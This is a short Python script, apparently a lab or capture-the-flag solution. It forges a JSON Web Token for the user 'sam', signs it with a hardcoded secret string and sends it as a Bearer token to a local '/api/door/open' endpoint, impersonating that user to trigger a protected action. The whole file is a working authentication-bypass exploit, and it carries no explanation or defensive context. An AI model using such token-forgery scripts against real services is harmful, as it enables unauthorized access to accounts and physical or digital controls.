import requests

import jwt

s = requests.session()

encoded_jwt = jwt.encode({"username": "sam"}, "$2a$12$SlvUDXwr7jCQXERS0WZx..bnvmThxBDRXCLHQwwZGGyczDUjNpSDG", algorithm="HS256")

reque = s.get("http://127.0.0.1:5000/api/door/open", headers={"Authorization": "Bearer " + encoded_jwt})


print(reque.json())